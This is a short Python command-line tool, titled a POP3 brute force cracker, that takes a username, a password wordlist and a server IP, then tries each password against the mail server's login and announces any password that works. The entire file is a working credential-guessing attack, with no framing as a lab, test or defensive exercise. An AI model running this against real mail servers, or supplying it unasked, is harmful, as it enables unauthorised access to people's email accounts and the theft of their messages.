import poplib
import argparse
from colorama import Fore, init
import time

# Initialize colorama
init(autoreset=True)

def brute_force_pop3(target_ip, password_list, username):
    print(Fore.YELLOW + f"Starting Bruteforce on POP3 server at {target_ip}...")
    
    try:
        # Connect to the POP3 server
        server = poplib.POP3(target_ip)
        print(Fore.CYAN + f"Connected to {target_ip}.")
    except Exception as e:
        print(Fore.RED + f"Error: Unable to connect to {target_ip} - {e}")
        return

    # Try each password from the list
    for password in password_list:
        print(Fore.GREEN + f"Trying Passphrase: \"{password}\"...")
        try:
            server.user(username)
            server.pass_(password)
            # If the login is successful, it will not raise an exception
            print(Fore.GREEN + f"KEY FOUND: [\"{password}\"]")
            server.quit()
            break
        except poplib.error_proto:
            # This means password is incorrect, continue with the next one
            pass
        time.sleep(0.5)  # Adding a small delay between tries

    else:
        # If we looped through the list and did not find a password
        print(Fore.RED + "KEY NOT FOUND")

def load_password_list(password_file):
    with open(password_file, "r") as file:
        return [line.strip() for line in file.readlines()]

def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(description="POP3 Brute Force Cracker")
    parser.add_argument("username", help="Username to attempt login with")
    parser.add_argument("-P", "--passwordlist", required=True, help="Path to the password list file")
    parser.add_argument("target", help="POP3 server IP address")

    # Parse arguments
    args = parser.parse_args()

    # Load passwords
    password_list = load_password_list(args.passwordlist)

    # Perform brute force
    brute_force_pop3(args.target, password_list, args.username)

if __name__ == "__main__":
    main()
